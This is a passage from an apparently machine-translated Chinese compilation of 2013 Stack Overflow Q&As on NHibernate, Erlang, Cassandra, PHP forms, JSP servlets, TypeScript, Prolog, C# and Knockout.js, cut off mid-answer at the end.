运行正确的 SQL 查询，返回为联系人补充所需的所有信息，如 NHProf 的屏幕截图所示（突出显示的查询）（不要担心不同的表名等 - 我已经清理了上面的代码）：

![NHProf](../Images/5e468891ee968aefdd3034269f2d4eb0.png)

我不明白为什么会生成并运行对 PasswordResetToken 表的数十个单独选择？其中一个查询仅针对没有 PasswordResetToken 的每个联系人生成（即第一个查询为这些列返回空值） - 不确定这与它有什么关系。

一个联系人可能有也可能没有几个角色（对于这个问题是多余的），同样，可能有也可能没有一个 PasswordResetToken。

数据库有点狡猾，外键很少。在这种情况下，Contact 和 PasswordResetToken 之间的链接是一个简单的共享列“EmailAddress”。

所有这些查询都是在运行上面的那一行代码时生成的（即，该代码不在循环中）。

如果我遗漏任何信息，请告诉我。

我应该在谷歌上搜索什么？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-03-20T16:00:21.000

这是一个[错误](https://nhibernate.jira.com/browse/NH-2534)。我会尝试让它只使用两个查询，尽管从错误报告中听起来这将是一个挑战。

> 附加的测试表明，引用唯一属性（而不是 Id）的多对一关联会导致选择 n+1 问题。虽然第一条语句包含了正确的连接，但是所有关联的实体都是在连接选择之后一个接一个地取出来的。（在唯一列中具有相同值的实体甚至被多次获取。）
> 
> 有趣的一点是，仅当引用的实体已经在会话缓存中时才会出现此错误。如果不是，则不会创建其他选择语句。

# erlang - [ ... || 是什么意思？... <- ...] 在这段代码中做什么？

> ID：15526373
> 
> 赞同：2
> 
> 时间：2013-03-20T14:29:12.090
> 
> 标签：erlang

我再次需要你的帮助，我正在尝试理解这段 erlang 代码。

```
Line="This is cool".
Lines = [Line || _Count <- lists:seq(1,5)]. 
```

输出是

```
["This is cool","This is cool","This is cool","This is cool","This is cool"] 
```

我不明白打印所需次数背后的逻辑。是什么`Line || _*****`意思？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-20T15:19:28.540

看这段代码：

```
Line = "This is cool".
Lines = [{Line, Count} || Count <- lists:seq(1, 5)]. 
```

在这里，您创建一个大小为 2 的元组列表，其中第一个元素是常量，第二个元素取自列表理解的源列表。如果你从元组中删除一个元素，它不会改变列表的结构。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-03-20T14:39:06.017

由于`Line`列表推导右侧的值没有改变，因此每个元素的值都是相同的，即 的值`Line`。

列表理解的右侧只是确定元素的数量。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-03-20T19:29:00.877

可以这样读：**NewListe = [Dosomething || 元素 <- 列表]**

以这种方式创建一个 NewListe：对于 Liste 的每个元素，使用 Dosomething 构建一个新元素。

逐步给出 Liste = lists:seq(1,5) = [1,2,3,4,5];

对于每个元素，只需丢弃元素的值（这就是它被写为 _Count 的原因）和

Dosomething 只是发回“这很酷”的值，

结果是 5 次“这很酷”的列表

["这很酷","这很酷","这很酷","这很酷","这很酷"]

<- 称为生成器；标志后|| 您可能有生成器或过滤器。例如，如果我们假设您有一个不同元素的列表，并且只想获取可打印的列表项，将其转换为大写，您将需要一个生成器：

> X <- ["toto",5,"Hello",atom]**获取每个元素**

过滤器：

> io_lib:printable_list(X)**仅选择可打印列表**

和一个转变：

> string:to_upper(X)**转为大写**

总之，你有什么期望：

```
1> [string:to_upper(X) || X <- ["toto",5,"Hello",atom], io_lib:printable_list(X)].
["TOTO","HELLO"]
2> 
```

# cassandra - 如何使用 cassandra-cli 更新 gc_grace_seconds？

> ID：15526379
> 
> 赞同：12
> 
> 时间：2013-03-20T14:29:35.530
> 
> 标签：cassandra

使用 更新列族并更改其`gc_grace_seconds`值的命令是什么`cassandra-cli`？

* * *

## 回答 #1

> 赞同：35
> 
> 时间：2014-02-26T02:56:56.750

对于 CQLSH

```
alter table <table_name> with GC_GRACE_SECONDS = <timeout>; 
```

例如：

```
alter table yawn with GC_GRACE_SECONDS = 3600; 
```

其中 yawn 是我们的表名，3600 是一个小时；

* * *

## 回答 #2

> 赞同：11
> 
> 时间：2013-11-20T13:46:09.267

On`cassandra-cli`没有“秒”

```
UPDATE COLUMN FAMILY cf with GC_GRACE = 86400; //one day 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-03-20T21:46:19.090

```
use ks;
update column family cf with gc_grace_seconds = 864000; 
```

# php - PHP传递多个属性

> ID：15526380
> 
> 赞同：0
> 
> 时间：2013-03-20T14:29:36.863
> 
> 标签：php, html

当我按下“提交”按钮时，我想在 rateFunction.php 中发送“等级”值和值 $chosenBarName，有没有简单的方法可以做到这一点？我只成功获得了“等级”值......

```
$chosenID = $row['BarName'];
echo "<td>" . $row['BarID'] . " " . $row['BarName'] . "<br>" . $row['Website'] . "</td>";
    <form method="post" action="rateFunction.php">
        <select name="grade">
            <option value="5">5</option>
            <option value="4">4</option>
            <option value="3">3</option>
            <option value="2">2</option>
            <option value="1">1</option>
        </select>
    <input type="submit" name="submit"/>
</form> 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-20T14:32:09.840

在其中放置一个带有 BarName 值的隐藏字段，如下所示：

```
<input type="hidden" name="BarName" value="<? echo $row['BarName']?>" /> 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-20T14:31:58.983

将 barName 作为隐藏输入放在表单标签内

```
$chosenID = $row['BarName'];
echo "<td>" . $row['BarID'] . " " . $row['BarName'] . "<br>" . $row['Website'] . "</td>";
    <form method="post" action="rateFunction.php">

        <input type="hidden" name="barname" value="<?= $row['BarName'];?>">

        <select name="grade">
            <option value="5">5</option>
            <option value="4">4</option>
            <option value="3">3</option>
            <option value="2">2</option>
            <option value="1">1</option>
        </select>
    <input type="submit" name="submit"/>
</form> 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-03-20T14:32:14.927

在您的标签内，您可以渲染一些隐藏元素以保留您需要的信息。

```
echo '<input type="hidden" id="barname" value="'.$choosebarname.'" />'; 
```

应该做的伎俩

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-03-20T14:32:10.433

包括一个隐藏字段。

```
<input type="hidden" value="<?= $row['BarName'];?>" /> 
```

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2013-03-20T14:32:30.813

您可以添加另一个字段：`<input type=hidden name='chosenBarName' value='<?php echo $chosenBarName ?>'/>`

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2013-03-20T14:33:23.277

你必须将它作为一个字段传递，你可以使用一个`hidden`字段

```
$chosenID = $row['BarName'];
echo "<td>" . $row['BarID'] . " " . $row['BarName'] . "<br>" . $row['Website'] . "</td>";
    <form method="post" action="rateFunction.php">
        <input type="hidden" name="chosenBarName" value="<?php echo $row['BarName'];?>"> 
        <select name="grade">
            <option value="5">5</option>
            <option value="4">4</option>
            <option value="3">3</option>
            <option value="2">2</option>
            <option value="1">1</option>
        </select>
    <input type="submit" name="submit"/>
</form> 
```

# c# - Visual Studio 2010 中可能有不同的编辑器风格吗？

> ID：15526385
> 
> 赞同：0
> 
> 时间：2013-03-20T14:29:43.253
> 
> 标签：c#, visual-studio-2010, styles

简而言之，我非常喜欢编写漂亮的代码，这里有一篇很棒的文章 [Doom 3 源代码之美](http://kotaku.com/5975610/the-exceptional-beauty-of-doom-3s-source-code)我在 Visual Studio 之前一直在使用不同的代码编辑器。我喜欢紧凑的写作风格。我不喜欢几乎是空的白线

```
public void my function(string s)
{                                          //almost empty line
   string n = domystuff();
   if (n=="blanc")
     {                                     //almost empty
        mycode("should start a row earlier on { line");
     }                                     //..
    else
     {
        ohno.notagain("another two blanc lines above and below else");
        Altough.it.compiles("equaly");
        myscreen.used = not.optimal;
     }
 } 
```

如果代码写得更好，那么它很好读，如果有很多白线很好读，那么白线会破坏它。所以我想知道这种自动格式可以在 VS2010 中更改吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-20T14:41:29.973

C# 作为一门语言有一组编码约定，C# 程序员希望这些约定在项目之间保持一致。如果您想使用 One True Brace 样式，请切换到 Java。

如果您坚持做一个奇怪的人，您可以在工具 → 选项... → 文本编辑器 → C# → 格式化中配置 Visual Studio 自动格式化程序。

# box-api - box-api 无法获取 auth_token

> ID：15526387
> 
> 赞同：0
> 
> 时间：2013-03-20T14:29:45.313
> 
> 标签：box-api

我正在尝试开发与盒子的集成。我正在使用“box-api”、“~> 0.2.2”gem。我有一个 api 密钥。

```
box_object = Box::Api.new("j7p3zz29xgva8t52lgoptyxuavtji66y")
ticket = box_object.get_ticket
auth_key= box_object.get_auth_token(ticket[:ticket]) 
```

我收到了这个异常 Box::Api::NotAuthorized: not_logged_in

谁能建议出了什么问题？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-20T16:48:10.720

`ticket`用于构建您的应用程序必须将用户重定向到的 URL 。这是 v1 身份验证过程的第一站。本[文档](http://developers.box.com/v1-authentication/)提供指南。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2018-08-29T01:32:07.043

除了检查上述答案外，还要确保盒子管理员已经批准了一个应用程序才能使用它。

请参阅 。- [https://community.box.com/t5/How-to-Guides-for-Admins/Enabling-Custom-Built-Applications/ta-p/2188](https://community.box.com/t5/How-to-Guides-for-Admins/Enabling-Custom-Built-Applications/ta-p/2188)

# c# - 如何知道线程从哪里开始

> ID：15526388
> 
> 赞同：0
> 
> 时间：2013-03-20T14:29:49.077
> 
> 标签：c#, .net, multithreading, visual-studio-2010

我有一个函数，我在其中放置断点，并且可以看到它位于 UI 线程以外的不同线程中，我的意思是它是工作线程。我为此检查了线程窗口，当我检查创建和启动线程的位置时，我找不到。即使我也检查了调用堆栈。当我钻孔时，我只能看到那些开始的东西

```
System.dll!System.Net.LazyAsyncResult.Complete(System.IntPtr userToken) + 0x6c bytes 
```

并以

```
mscorlib.dll!System.Threading._IOCompletionCallback.PerformIOCompletionCallback(uint errorCode, uint numBytes, System.Threading.NativeOverlapped* pOVERLAP) + 0x74 bytes 
```

我们有什么机制可以找到线程的起点吗？我的目的是改变工作线程的线程的aprtmentmodel

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2013-03-20T14:59:27.497

由于您正在执行一些套接字操作并且线程显然以 IO 完成回调开始，我的精神力量告诉我这是一个 IO 完成线程。它通知您，您在该套接字上启动的异步 IO 操作已由网卡完成。

> 我的目标是改变工作线程的线程的aprtmentmodel

你没有启动那个线程；网络套接字层可能做到了。如果我是你，我不会试图改变这一点。

# jsp - 点击提交后无法访问doPost

> ID：15526389
> 
> 赞同：0
> 
> 时间：2013-03-20T14:29:49.993
> 
> 标签：jsp

我正在尝试使用 .jsp 和 servlet 创建一个简单的登录页面。单击 LogIn.jsp 表单中的按钮后，我似乎无法触发 doPost 方法。我的代码如图所示：

登录.jsp

```
 <%@page contentType="text/html" pageEncoding="UTF-8"%>

<html>
    <head><title>LogIn JSP Page</title></head>
    <body bgcolor="white">
        <h1>LogIn JSP Page</h1>
        <form action="CheckLogIn" method="POST">
            <table>
                <tr>
                    <td align="right">Member ID:</td>
                    <td align="left"><input type="text" name="memId" length="30"/>
                    </td>
                </tr>
                <tr>
                    <td align="right">Password:</td>
                    <td align="left"><input type="text" name="pw" length="30"/>
                    </td>
                </tr>
            </table>
            <p><input type="submit" value="Log In"/></p>
        </form>
    </body>
</html> 
```

CheckLogIn.jsp

```
<%@page contentType="text/html" pageEncoding="UTF-8"%>

<html>
    <head>
        <title>CheckLogIn JSP Page</title>
    </head>
    <body>
        <h1>Check LogIn</h1>
        <%
            String data=(String)request.getAttribute("data");
        %>
        <table>
            <tr>
                <td align="left"><%=(String)data%></td>
            </tr>
        </table>
    </body>
</html> 
```

库SystemServlet.java

```
 public class LibrarySystemServlet extends HttpServlet {
    @EJB
    private MemberManagerRemote mm;

    private String success=null;

    public void init(){
        System.out.println("LibrarySystemServlet: init()");
    }

    protected void processRequest(HttpServletRequest request, HttpServletResponse response)
    throws ServletException, IOException {
        System.out.println("LibrarySystemServlet: processRequest()");
        try {
            RequestDispatcher dispatcher;
            ServletContext servletContext=getServletContext();

            String page=request.getPathInfo();
            page=page.substring(1);

            if("CheckLogIn".equals(page)){
                success=logIn(request);
                request.setAttribute("data", success);
            }
            else{
                page="Error";
            }
            dispatcher=servletContext.getNamedDispatcher(page);
            if(dispatcher==null){
               dispatcher=servletContext.getNamedDispatcher("Error");
            }
            dispatcher.forward(request, response);
        } catch(Exception ex) {
            log("Exception in LibraySystemServlet.processRequest()");
        }
    } 

    private String logIn(HttpServletRequest request){
        String s;
        String memberId=request.getParameter("memId");
        String pw=request.getParameter("pw");
        if(pw.equals(mm.getMemberPw(memberId))){
            s="Success";
        }
        else{
            s="Failed";
        }
        return s;
    }

    @Override
    protected void doGet(HttpServletRequest request, HttpServletResponse response)
    throws ServletException, IOException {
        System.out.println("LibrarySystemServlet: doGet()");
        processRequest(request, response);
    } 

    @Override
    protected void doPost(HttpServletRequest request, HttpServletResponse response)
    throws ServletException, IOException {
        System.out.print("LibrarySystemServlet: doPost()");
        processRequest(request, response);
    }

    public void destroy(){
        System.out.println("LibrarySystemServlet: destroy()");
    }
} 
```

web.xml

```
 <?xml version="1.0" encoding="UTF-8"?>
<web-app version="2.5" xmlns="http://java.sun.com/xml/ns/javaee" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:schemaLocation="http://java.sun.com/xml/ns/javaee http://java.sun.com/xml/ns/javaee/web-app_2_5.xsd">
    <servlet>
        <servlet-name>LibrarySystemServlet</servlet-name>
        <servlet-class>servlets.LibrarySystemServlet</servlet-class>
    </servlet>
    <servlet>
        <servlet-name>CheckLogIn</servlet-name>
        <jsp-file>/CheckLogIn.jsp</jsp-file>
    </servlet>
    <servlet>
        <servlet-name>Error</servlet-name>
        <jsp-file>/Error.jsp</jsp-file>
    </servlet>
    <servlet-mapping>
        <servlet-name>CheckLogIn</servlet-name>
        <url-pattern>/CheckLogIn</url-pattern>
    </servlet-mapping>
    <servlet-mapping>
        <servlet-name>Error</servlet-name>
        <url-pattern>/Error</url-pattern>
    </servlet-mapping>
    <servlet-mapping>
        <servlet-name>LibrarySystemServlet</servlet-name>
        <url-pattern>/librarySystemServlet/*</url-pattern>
    </servlet-mapping>
    <session-config>
        <session-timeout>
            30
        </session-timeout>
    </session-config>
    <welcome-file-list>
        <welcome-file>LogIn.jsp</welcome-file>
        </welcome-file-list>
    </web-app> 
```

任何帮助将不胜感激！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-20T14:43:49.503

在您的 web.xml 文件中，您需要将 CheckLogIn 的请求映射到 servlets.LibrarySystemServlet 类而不是 CheckLogIn.jsp

```
<servlet>
        <servlet-name>CheckLogIn</servlet-name>
        <servlet-class>servlets.LibrarySystemServlet</servlet-class>
</servlet>
<servlet-mapping>
        <servlet-name>CheckLogIn</servlet-name>
        <url-pattern>/CheckLogIn</url-pattern>
</servlet-mapping> 
```

# c# - 使用 Click Once 部署时需要采取哪些步骤来重新生成清单

> ID：15526390
> 
> 赞同：3
> 
> 时间：2013-03-20T14:29:50.293
> 
> 标签：c#, deployment, clickonce

有许多问题表明在使用 ClickOnce 部署时必须重新生成应用程序的清单，尤其是在遇到问题时。

但是，我从诸如此类的文章中不清楚[我](https://stackoverflow.com/a/6231271/427684)需要采取哪些步骤才能在 Visual Studio 2008 中重新生成我的清单？（我知道我可能必须使用第三方工具而不是 Visual Studio 来执行此操作？）

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-03-20T17:10:10.413

您是否使用 Visual Studio 发布？如果是这样，那应该更新您的清单文件。

你也可以使用法师。我会从[UI 版本](http://msdn.microsoft.com/en-us/library/xhctdw55.aspx)开始，然后在您确定 Mage 是否适合您后转到[命令行版本。](http://msdn.microsoft.com/en-us/library/acz3y3te.aspx)只需打开并保存清单就可以了。何时/如果您移至命令行版本，请查看该`-update`命令。

# url - 如何处理 URL 协议 bundle://

> ID：15526392
> 
> 赞同：1
> 
> 时间：2013-03-20T14:29:56.877
> 
> 标签：url, osgi, knopflerfish

我尝试在我的包中获取一个文件：

```
File file = new File(bundleContext.getBundle().
getResource("image/logo.jpg").toURI()); 
```

结果是 IllegalArgumentException，原因是“URI 方案不是“文件”。

这是合乎逻辑的，但是我应该如何使用这个 URL（bundle://28/image/logo.jpg）打开一个文件？

如果我使用常规的 ClassLoader，我会得到相同的结果。

**编辑：**

我的解决方案：

```
URL url = this.getClass().getClassLoader().getResource("image/logo.jpg");
InputStream in = new BufferedInputstream(url.openStream()); 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-20T15:00:27.833

您无法打开文件，因为可能没有文件......所以只需获取输入流即可。这适用于所有 URL/URI。

# javascript - 没有 NodeJS 的 Typescript 命令行编译

> ID：15526394
> 
> 赞同：19
> 
> 时间：2013-03-20T14:30:00.513
> 
> 标签：javascript, command-line, typescript, build-script

我正在查看 Typescript，对如何通过命令行从 ts 文件构建 js 文件感到有些困惑。

它在文档中暗示您可以通过 nodeJS 轻松完成，如果我想要对 nodeJS 的依赖，那就太好了......那么有没有办法通过命令行编译它而无需 nodeJS 或 Visual Studio？

这对某些人来说可能看起来很疯狂，但如果可能的话，我会在最后放置一个构建脚本步骤来输出 javascript，然后将其打包到我的版本中，因为我倾向于使用 RubyMine 进行大部分 javascript 开发并且不想要我的构建服务器依赖于 nodeJS 或 Visual Studio。

* * *

## 回答 #1

> 赞同：14
> 
> 时间：2013-03-20T14:53:32.593

如果您在计算机上未安装 Visual Studio 的情况下安装[TypeScript 工具](http://www.microsoft.com/en-us/download/details.aspx?id=34790)，仍将安装 tsc.exe 及其依赖项。

您也可以将 xcopy deploy tsc.exe（我没有其依赖项的明确列表，但很容易弄清楚，或者只是将安装到 SDK 文件夹的所有内容复制到构建服务器）到构建服务器。您唯一需要的是 msvcr110.dll，您可能需要也可能不需要将其复制到 tsc.exe 的路径。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2018-06-08T11:54:19.987

Ryan 的答案中的链接现在已经严重过时，如果您使用它将生成 TS1005 错误。

这就是你想要的[https://www.microsoft.com/en-us/download/details.aspx?id=55258](https://www.microsoft.com/en-us/download/details.aspx?id=55258)它仍然放在同一个 Program files x86 / Microsoft SDKs 目录中，至少对我来说不是添加到我的路径。

# javascript - 如何使用搜索或匹配自动填充拼接（索引开始，结束）？

> ID：15526397
> 
> 赞同：0
> 
> 时间：2013-03-20T14:30:05.463
> 
> 标签：javascript

```
var Names = ["Smith", "Jones", "Jack", "Paul", "King"];
var Kings = [];
var allOthers = [];

alert (Names);
allOthers = Names; 
```

//这里 Javascript 应该搜索名称`King`，如果它在数组中找到它`allOthers`，那么它//应该将它移动到数组`Kings`中。我尝试使用搜索和匹配，但我无法让它工作。

//在下一行代码中，我为 slice 方法提供了字符串的索引，`King`但它应该 // 自动填充`King`数组中名称的索引`allOthers`并将其移动到 //`Kings`数组。如何实现？

```
Kings = Names.splice(4,1);

alert (Kings);
alert (allOthers); 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-20T14:53:45.013

你可以找到“King”的索引`indexOf`并在你的`splice`. 另外，`splice`修改原始数组，因此您`Names`已经修改为“allOthers”

```
var names, kings;
names = ["Smith", "Jones", "Jack", "Paul", "King"];

if(names.indexOf('King') > -1){
  kings = names.splice(names.indexOf('King'),1);
}
console.log(kings); // ["King"]
console.log(names); // ["Smith", "Jones", "Jack", "Paul"] 
```

# php - PHPUnit 说我没有将参数传递给父类方法。我是

> ID：15526406
> 
> 赞同：0
> 
> 时间：2013-03-20T14:30:26.433
> 
> 标签：php, unit-testing, phpunit

我有一个扩展抽象父类的测试类。父类 extends `PHPUnit_Framework_TestCase`，它定义了所有测试都将使用的一些方法。

我在调用父母方法时遇到问题。Phpunit 说我没有为该方法提供任何参数，但我是。

这是孩子的方法

```
public function testEmptyGarbageNullDataDoesntValidate() {
    $rule = new Rule\Between( 1, 10 );
    $this->testNullDataDoesntValidate( $rule );
    // $this->testEmptyDataDoesntValidate( $rule );
    // $this->testGarbageDataDoesntValidate( $rule );
} 
```

这是父方法

```
public function testNullDataDoesntValidate( \Validator\Rule $rule ) {
    $this->validator->addRule( 'null', $rule );
    $this->assertFalse( $this->validator->validate( array( 'null' => null ) ) );
} 
```

我收到错误

> 传递给 BaseRuleTest::testNullDataDoesntValidate() 的参数 1 必须是 Validator\Rule 的实例，没有给出

它是说没有给出，但它被给出了。我可以进入孩子的功能`var_dump( $rule )`并查看数据，它肯定存在。

这是`var_dump`父方法中的 from

```
object(Validator\Rule\Between)#210 (2) {
  ["min_value":protected]=>
  int(1)
  ["max_value":protected]=>
  int(10)
} 
```

我假设它与 phpunit 的工作方式有关。我是phpunit的新手。

有任何想法吗？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-03-20T14:35:09.640

尝试重命名`testNullDataDoesntValidate`为不以`test`.

实际测试的函数以单词“test”开头。见这里：[http ://www.phpunit.de/manual/3.6/en/writing-tests-for-phpunit.html](http://www.phpunit.de/manual/3.6/en/writing-tests-for-phpunit.html)

因为这使它们成为实际测试，所以 phpunit 不带参数地调用它。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-03-20T14:40:20.607

> 传递给 BaseRuleTest::testNullDataDoesntValidate() 的参数 1 必须是 Validator\Rule 的实例，没有给出

该错误来自 PHPUnit 试图调用该*测试*方法，而不是来自调用该方法的代码。

如果您已包含堆栈跟踪（安装 xdebug 以始终看到它），那将是显而易见的。

# php - 使用 foreach 循环遍历 DOM 树

> ID：15526409
> 
> 赞同：1
> 
> 时间：2013-03-20T14:30:35.570
> 
> 标签：php, html, parsing, simple-html-dom

需要帮助使用[Simple HTML DOM Parser](http://simplehtmldom.sourceforge.net/manual.htm#section_traverse)遍历 DOM 树。如果有人可以花点时间看看它是如何工作的，那么如果我弄明白了，知识渊博的 PHP 编码人员应该很快就能弄明白。我被困的地方是从我朋友的俄罗斯篮球网站上的一个 div 中获取文章。例如，博客 div 如下所示：

```
<div id='columnsList'><div class='item'>
  <div class='title'><a href='/ru/columns/1'>Колонка Римантаса Григаса</a></div>
  <div class='img'> <img src='/files/columns/grigas.jpg'></div>
  <div class='news'>
    <a href='/ru/news/3174'>Римантас Григас: о пути на Евробаскет (0)</a>
    <a href='/ru/news/1486'>Римантас Григас: об уходе из УГМК и о ближайших планах (1)</a>
    <a href='/ru/news/731'>О горниле «Финала восьми» Евролиги (0)</a>
    <a href='/ru/news/421'>О новом назначении и о сборной Украины (0)</a>
    <a href='/ru/news/299'>О настоящем примере для подражания (0)</a>
  </div><div style='clear:left;'></div> 
  </div>
  <div class='item'>
  <div class='title'><a href='/ru/columns/2'>Колонка Кирилла Натяжко</a></div>
  <div class='img'> <img src='/files/columns/nati.jpg'> </div>
  <div class='news'>
    <a href='/ru/news/3618'>Кирилл Натяжко: "Хорватов мы не боимся" (2)</a>
    <a href='/ru/news/3113'>Кирилл Натяжко: "Необоснованная критика подарила мне дополнительную мотивацию" (1)</a>
    <a href='/ru/news/2454'>Кирилл Натяжко: "Мне нечего бояться, пускай лучше боятся меня!" (6)</a>
    <a href='/ru/news/325'>Доброе утро, страна! (1)</a>
  </div><div style='clear:left;'></div> 
</div>
<div class='news'>
//More divs and links 
```

这就是我可以拉出单个“a”链接并显示它们的方法，但我想要做的是获取所有这些链接的 div 标题，基本上是对它们进行分类，而不是把所有的东西都排成一排。我无法弄清楚如何在 foreach 循环中做到这一点。

```
foreach ($html->find('div[class=item] a[href*=news]') as $col){
   echo $col.'<br>';
} 
```

我尝试与第一个回声一起添加：

```
echo $col->parent()->prev_sibling()->prev_sibling()->a; 
```

那应该回到 div 'news'，然后再到 div 'img' 再到 div 'title'。那应该得到第一个 div=title 的链接。但我什么也得不到。有没有办法做到这一点？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-20T14:35:40.917

尝试这个：

```
$output = array();
foreach($html->find('div[class=item]' as $item) {
   $title = $item->find('div[class=title] a', 0)->innertext;
   $output[$title] = array();
   foreach($item->find('div[class=news] a') as $link) {
       $output[$title][] = $link->innertext;
   }
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-20T15:07:46.827

这是不使用数组的方法！

```
foreach ($html->find('div[class=item]') as $item){
    echo $item->children(0)->plaintext;
    foreach ($item->find('a[href*=news]') as $col){
      echo $col.'<br>';
    }
} 
```

得到了想要的结果！

# winforms - 如何在 ALT+TAB 视图和任务栏中设置不同的图标

> ID：15526410
> 
> 赞同：0
> 
> 时间：2013-03-20T14:30:37.487
> 
> 标签：winforms, visual-studio-2012, icons, taskbar

我有一个 Winform 应用程序，我会设置两个不同的图标，一个用于显示在任务栏和窗口左上角的应用程序，另一个用于 ALT+TAB 开关。Form 的属性 Icon 只设置了一个小的，但似乎它也用于 ALT+TAB 视图。在 Visual Studio 2012 中，我已经尝试在项目属性 > 应用程序 > 资源 > 图标和清单下选择不同的图标。

任何帮助将不胜感激！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-04T07:02:20.600

我得到了非常简单的解决方案。基本上，我创建了一个具有相同图像（64x64、32x32...）的多尺寸图标，并用另一个图标更改了 16x16 尺寸。通过这种方式，您可以在一个内部拥有不同类型的图标。

# select - 使用 Prolog 选择谓词？

> ID：15526413
> 
> 赞同：1
> 
> 时间：2013-03-20T14:30:52.977
> 
> 标签：select, recursion, prolog, logic, predicate

我正在尝试制作一个程序，`seat(Guests, Seating)`如果可以将列表中的人重新排列到座位列表中，以便每个人都与两边的人兼容，那么我正在尝试制作一个程序。

我有每个人的事实：

```
topics(neil, [diving, football, computers, hockey]). 
```

ETC...

我还有一个共同的谓词，这是一个测试两个人是否有共同话题的规则。

```
common(Person1, Person2, Topic) 
```

我将不得不使用内置的选择谓词和我的用户定义的公共谓词，但我不确定如何使用。

有人可以提供合适的解决方案或解释吗？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-03-20T15:02:29.900

假设您不必在座位列表的第一个人和最后一个人之间有共同话题，您可以：

*   从客人中选择一位客人，这也将获得没有所选客人的座位列表
*   调用一个递归过程，接受该客人并选择另一个客人（再次返回剩余客人的列表），并测试兼容性。如果它们兼容，则递归调用该过程与新客人。
*   此过程的基本情况是客人列表中没有客人时。

这看起来像：

```
seats(Guests, [Person1|Seating]):-
  select(Person1, Guests, NGuests),  
  seats1(Person1, NGuests, Seating).

seats1(_, [], []).
seats1(LPerson, Guests, [RPerson|Seating]):-
  select(RPerson, Guests, NGuests),
  common(LPerson, RPerson, _),  % There is a common topic between them
  seats1(RPerson, NGuests, Seating). 
```

# c# - BindingList 和 InotifyPropertyChanged

> ID：15526416
> 
> 赞同：1
> 
> 时间：2013-03-20T14:30:59.173
> 
> 标签：c#, bindinglist

我已经搜索了所有论坛，但我找不到我的问题的答案。也许我只是使用了错误的关键字。假设我有一个类 Foo：

```
class Foo
{
    string a;
    string b;
} 
```

Foo 的许多实例现在保存在一个

```
BindingList<Foo> bf; 
```

然后我有第二个类，它实现了 Foo 类型的对象之间的某种关系：

```
class Bar
{
    Foo f1;
    Relation r;
    Foo f2;
} 
```

同样，类 Bar 的一些实例保存在一个

```
BindingList<Bar> bb; 
```

在我的程序的某个时刻，我现在删除了 Foo 的一个实例，比如 f7。

```
bb.Remove(f7); 
```

有没有可能，正是那些引用 f7 的 Bar 实例被删除了？此刻，我钩住 bf 的 ListChanged 事件并手动遍历 bb 并杀死那些包含 f7 的 Bar 实例。有没有更聪明的方法？

谢谢你的帮助，圭多

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-20T14:38:54.860

根据您的 OP 判断。我怀疑你想要这样的东西。您必须确保您的`Foo`对象`Bar`是相同的实例，或者`IEquatable`在`Foo`.

```
var barWhereFoosExist = bb.Where(x => x.f1.Equals(f7) || x.f2.Equals(f7));
foreach(Bar b in barWhereFoosExist)
{
  bb.Remove(b);
} 
```

使用类似的方法尝试上述方法。

```
BindingList<Bar> bb = new BindingList<Bar>();
Foo f7 = new Foo();
Bar b = New Bar();
b.f1 = f7;
b.f2 = new Foo(); 
```

# knockout.js - Knockout Mapping - 使用嵌套对象自定义创建

> ID：15526417
> 
> 赞同：10
> 
> 时间：2013-03-20T14:30:59.357
> 
> 标签：knockout.js, mapping

我遇到了 KnockoutJS 的映射插件的问题，我需要执行以下操作：

1.  自定义对象的映射创建
2.  从 #1 自定义嵌套对象数组的映射创建。

在这个[小提琴示例](http://jsfiddle.net/5cfa3/)中，我正在尝试让*孩子*正确映射到他们的自定义创建。预期的结果是每个*孩子*都有添加的*描述*属性。从小提琴，结果应该是：

*   亚当·斯密
*   鲍勃 5 岁
*   克里斯今年 7 岁

我可以在这个[小提琴示例](http://jsfiddle.net/7Py7P/1/)中演示预期的行为。请注意，在这段代码中，我必须有两个数据集，第一个有一个空的子对象数组。以下代码行将导致子对象的自定义创建：

```
ko.mapping.fromJS(additionalData, parentMapping, viewModel); 
```

不幸的是，这需要有空的初始*孩子*和两次映射。这是不可接受的，因为实际上代码的层次结构要深得多。

除了上述之外，我还尝试在 parentMapping 中添加以下代码：

```
var mapping = { 'ignore': ["children"] };
var innerModel = ko.mapping.fromJS(options.data, mapping);
//for brevity
innerModel.children = ko.mapping.fromJS(options.data.children, childMapping); 
```

这具有将*子*对象映射到初始映射的效果。但是，*children*属性的所有后续映射都将被忽略。

有没有办法使用 Knockout Mapping 自定义父对象和子对象的创建？

谢谢你。

* * *

## 回答 #1

> 赞同：18
> 
> 时间：2013-03-20T14:57:04.487

[http://jsfiddle.net/5cfa3/23/](http://jsfiddle.net/5cfa3/23/)

```
var viewModel = {};

var data = {
  id: "1",
  firstName: 'Adam',
  lastName: "Smith",
  children: [ {id: "2", name: "Bob", age: 5}, {id: "3", name: "Chris", age: 7 }]
};

var Parent = function(data){
  ko.mapping.fromJS(data, mapping, this)
};

var mapping = {
  create:function(options){
    var parent = new Parent(options.data);
